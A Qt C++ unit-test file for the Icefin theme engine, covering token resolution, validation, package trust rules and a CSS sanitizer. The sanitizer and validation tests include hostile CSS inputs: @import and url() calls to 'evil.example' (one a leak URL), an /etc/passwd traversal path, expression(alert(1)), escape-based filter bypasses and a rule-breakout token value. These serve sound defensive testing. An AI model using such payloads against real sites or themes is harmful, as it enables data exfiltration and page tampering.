// Unit tests for the theme engine's tokens and packages (PLAN 6.5).
#include <QtTest>
#include <QJsonDocument>
#include "icefin/theme/Tokens.h"
#include "icefin/theme/ThemePackage.h"
#include "icefin/theme/CssSanitizer.h"
#include "icefin/theme/ThemeScheme.h"
#include <QTemporaryDir>

using namespace Icefin::Theme;

static QJsonObject json(const char* s) { return QJsonDocument::fromJson(s).object(); }

class TestTheme : public QObject
{
  Q_OBJECT
private slots:
  void flattenNestedAndValueObjects()
  {
    QStringList e;
    TokenMap t = flatten(json("{\"color\": {\"accent\": \"#123456\", \"focus\": {\"$value\": \"#abcdef\", \"$description\": \"x\"}}," "                                  \"shape\": {\"cardRadius\": 4}, \"$description\": \"ignored\"}"), &e);
    QVERIFY2(e.isEmpty(), qPrintable(e.join("; ")));
    QCOMPARE(t.value("color.accent"), QString("#123456"));
    QCOMPARE(t.value("color.focus"), QString("#abcdef"));
    QCOMPARE(t.value("shape.cardRadius"), QString("4"));
    QCOMPARE(t.size(), 3);
    flatten(json("{\"bad-name\": \"x\", \"color\": {\"list\": [1]}}"), &e);
    QCOMPARE(e.size(), 2);
  }
  void resolveReferencesAndCycles()
  {
    QStringList e;
    TokenMap r = resolve({{"a", "{b}"}, {"b", "{c}"}, {"c", "#010203"}, {"d", "1px solid {c}"}}, &e);
    QVERIFY(e.isEmpty());
    QCOMPARE(r.value("a"), QString("#010203"));
    QCOMPARE(r.value("d"), QString("1px solid #010203"));
    resolve({{"x", "{y}"}, {"y", "{x}"}}, &e);
    QVERIFY(e.join(" ").contains("cycle"));
    e.clear();
    resolve({{"x", "{nope}"}}, &e);
    QVERIFY(e.join(" ").contains("unknown"));
  }
  void channels()
  {
    QCOMPARE(colorChannel("#00a4dc"), QString("0 164 220"));
    QCOMPARE(colorChannel("#fff"), QString("255 255 255"));
    QCOMPARE(colorChannel("#11223344"), QString("17 34 51"));
    QCOMPARE(colorChannel("rgba(1, 2, 3, 0.5)"), QString("1 2 3"));
    QCOMPARE(colorChannel("rgb(10 20 30 / 50%)"), QString("10 20 30"));
    QVERIFY(colorChannel("red").isEmpty());
    QVERIFY(colorChannel("rgb(300, 0, 0)").isEmpty());
  }
  void validation()
  {
    TokenMap t;
    for (const QString& r : requiredTokens()) t[r] = r.startsWith("color.") ? "#000000" : "4px";
    QVERIFY(validate(t).isEmpty());
    TokenMap bad = t;
    bad.remove("color.focus");
    bad["color.accent"] = "url(x)";
    bad["font.family"] = "x; } body { display: none";
    const QStringList e = validate(bad);
    QCOMPARE(e.size(), 3);
    QVERIFY(e.join(" ").contains("missing required token 'color.focus'"));
  }
  void cssOutput()
  {
    const QString css = toCss({{"color.accent", "#00a4dc"}, {"shape.cardRadius", "0.5em"}});
    QVERIFY(css.contains("--icefin-color-accent: #00a4dc;"));
    QVERIFY(css.contains("--icefin-color-accent-channel: 0 164 220;"));
    QVERIFY(css.contains("--icefin-shape-cardRadius: 0.5em;"));
    QVERIFY(!css.contains("shape-cardRadius-channel"));
  }
  void fixturePackageLoadsWithPreset()
  {
    Package p = loadPackage(QString(ICEFIN_THEMES) + "/lab-contrast", Source::Development);
    QVERIFY2(p.ok(), qPrintable(p.errors.join("; ")));
    QCOMPARE(p.id, QString("lab-contrast"));
    QStringList e;
    TokenMap base = p.resolved(QString(), {}, &e);
    QVERIFY(e.isEmpty());
    QCOMPARE(base.value("color.background"), QString("#160b2e"));  // via {palette.ink}
    TokenMap green = p.resolved("green", {}, &e);
    QVERIFY(e.isEmpty());
    QCOMPARE(green.value("color.focus"), green.value("color.accent"));  // the preset's reference resolves after overlay
    QCOMPARE(green.value("color.accent"), QString("#1fa83a"));
    p.resolved("missing", {}, &e);
    QVERIFY(e.join(" ").contains("unknown preset"));
  }
  void brokenPackageIsRefused()
  {
    Package p = loadPackage(QString(ICEFIN_THEMES) + "/lab-broken", Source::User);
    QVERIFY(!p.ok());
    const QString all = p.errors.join("\n");
    QVERIFY(all.contains("cycle"));
    QVERIFY(all.contains("missing required token"));
    QVERIFY(all.contains("won't put in CSS"));
    QVERIFY(all.contains("not a #hex"));
    QVERIFY(!loadPackage("/nonexistent", Source::User).ok());
  }
  void sanitizer()
  {
    SanitizedCss s = sanitizeCss("@import url(https://evil.example/x.css);\n"
                                 ".a{background:url(img/bg.png)} .b{background:url('https://evil.example/leak?x')}\n"
                                 ".c{background:url(//evil.example/y)} .d{background-image:image-set(\"https://e/x.png\" 1x)}\n"
                                 ".e{background:url(../../etc/passwd)} .f{width:expression(alert(1))} /* url(http://in.comment) */\n"
                                 "@font-face{font-family:x;src:url(\"fonts/x.woff2\")}", "my-theme", "css/styles.css");
    QVERIFY2(s.refusedReason.isEmpty(), qPrintable(s.refusedReason));
    QVERIFY(!s.css.contains("evil"));
    QVERIFY(!s.css.contains("@import"));
    QVERIFY(!s.css.contains("image-set"));
    QVERIFY(!s.css.contains("expression("));
    QVERIFY(!s.css.contains("passwd"));
    QVERIFY(s.css.contains("url(\"icefin-theme://my-theme/css/img/bg.png\")"));
    QVERIFY(s.css.contains("url(\"icefin-theme://my-theme/css/fonts/x.woff2\")"));
    QVERIFY(s.removed.size() >= 5);
    // Escapes that spell ASCII are refused; non-ASCII ones (icon fonts) are fine.
    QVERIFY(!sanitizeCss(".a{background:\\75 rl(https://e/x)}", "t", "s.css").refusedReason.isEmpty());
    QVERIFY(!sanitizeCss(".a{background:u\\rl(https://e/x)}", "t", "s.css").refusedReason.isEmpty());
    QVERIFY(sanitizeCss(".i::before{content:\"\\f101\"}", "t", "s.css").refusedReason.isEmpty());
    // A url( the parser can't read is refused, not guessed.
    QVERIFY(!sanitizeCss(".a{background:url(\"x)}", "t", "s.css").refusedReason.isEmpty());
  }
  void trustRules()
  {
    Package user; user.source = Source::User;
    Package bundled; bundled.source = Source::Bundled;
    QVERIFY(mayServe(bundled, "a.js", false));
    QVERIFY(!mayServe(user, "a.js", false));
    QVERIFY(!mayServe(user, "a.svg", false));
    QVERIFY(mayServe(user, "a.css", false));
    QVERIFY(mayServe(user, "a.woff2", false));
    QVERIFY(mayServe(user, "a.js", true));
    QVERIFY(!mayServe(bundled, "a.exe", false));
  }
  void contentHashFollowsFiles()
  {
    QTemporaryDir d;
    QFile f(d.path() + "/a.css"); QVERIFY(f.open(QIODevice::WriteOnly)); f.write("x"); f.close();
    const QByteArray h1 = hashDirectory(d.path());
    QCOMPARE(hashDirectory(d.path()), h1);
    QVERIFY(f.open(QIODevice::WriteOnly)); f.write("y"); f.close();
    QVERIFY(hashDirectory(d.path()) != h1);
    QDir(d.path()).mkdir("sub");
    QFile g(d.path() + "/sub/b.js"); QVERIFY(g.open(QIODevice::WriteOnly)); g.write("z"); g.close();
    QVERIFY(hashDirectory(d.path()) != h1);
  }
  void unknownMetaKeyRefused()
  {
    QTemporaryDir d;
    QFile m(d.path() + "/theme.json"); QVERIFY(m.open(QIODevice::WriteOnly));
    m.write("{\"schema\": 1, \"id\": \"x-theme\", \"name\": \"X\", \"version\": \"1\", \"scrpits\": []}"); m.close();
    QFile::copy(QString(ICEFIN_THEMES) + "/lab-contrast/tokens.json", d.path() + "/tokens.json");
    Package p = loadPackage(d.path(), Source::User);
    QVERIFY(p.errors.join(" ").contains("unknown key 'scrpits'"));
  }
};

QTEST_GUILESS_MAIN(TestTheme)
#include "test_theme.moc"
